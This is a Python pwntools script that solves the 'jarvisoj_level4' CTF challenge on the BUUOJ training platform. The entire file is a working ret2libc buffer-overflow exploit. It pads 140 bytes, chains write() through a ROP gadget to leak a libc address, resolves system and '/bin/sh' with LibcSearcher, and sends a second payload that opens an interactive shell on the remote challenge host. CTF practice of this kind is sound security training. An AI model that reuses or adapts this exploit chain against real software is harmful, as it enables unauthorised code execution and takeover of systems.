from LibcSearcher import LibcSearcher
from pwn import *


def jarvisoj_level4(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_level4'):
    print('jarvisoj_level4 start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 26865)
    target_elf = ELF(file_name)

    pop_ret_gadget = p32(0x080482f1)  # pop ebx ; ret
    pop3_ret_gadget = p32(0x08048509)  # pop esi ; pop edi ; pop ebp ; ret

    write_plt = p32(target_elf.plt['write'])
    write_got = p32(target_elf.got['write'])
    vuln_func_addr = p32(target_elf.symbols['vulnerable_function'])

    payload_1 = b'a' * 140
    # write(1, write_got, 0x8);
    payload_1 += write_plt + pop3_ret_gadget + p32(0x1) + write_got + p32(0x4)
    # vulnerable_function()
    payload_1 += vuln_func_addr

    target.sendline(payload_1)
    write_addr = u32(target.recv(4))

    searcher = LibcSearcher('write', write_addr)
    libc_base_addr = write_addr - searcher.dump('write')
    system_addr = p32(libc_base_addr + searcher.dump('system'))
    bin_sh_addr = p32(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'a' * 140
    # system('/bin/sh')
    payload_2 += system_addr + pop_ret_gadget + bin_sh_addr

    target.sendline(payload_2)
    target.interactive()


    print('jarvisoj_level4 end')


if __name__ == '__main__':
    jarvisoj_level4()
